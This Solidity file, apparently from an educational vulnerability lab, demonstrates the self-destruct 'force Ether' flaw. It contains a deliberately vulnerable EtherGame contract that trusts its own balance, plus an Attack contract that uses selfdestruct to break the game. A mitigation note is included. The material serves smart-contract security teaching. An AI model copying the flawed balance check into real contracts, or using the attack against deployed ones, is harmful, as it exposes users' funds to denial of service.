// SPDX-License-Identifier: MIT
// Source: https://github.com/SunWeb3Sec/DeFiVulnLabs
// Vulnerability: Self-Destruct / Force Ether
pragma solidity ^0.8.18;

/*
Name: Self-Destruct Vulnerability

Description:
The EtherGame contract can be broken by an attacker using selfdestruct to force
Ether into the contract, bypassing the deposit mechanism. This breaks the game
logic that relies on address(this).balance.

Mitigation:
Use a state variable to track deposited Ether instead of relying on address(this).balance.
*/

contract EtherGame {
    uint public constant targetAmount = 7 ether;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        // VULNERABILITY: Uses balance which can be manipulated via selfdestruct
        uint balance = address(this).balance;
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}

// Attack contract
contract Attack {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function dos() public payable {
        // Force ether into the contract to break the game
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
}
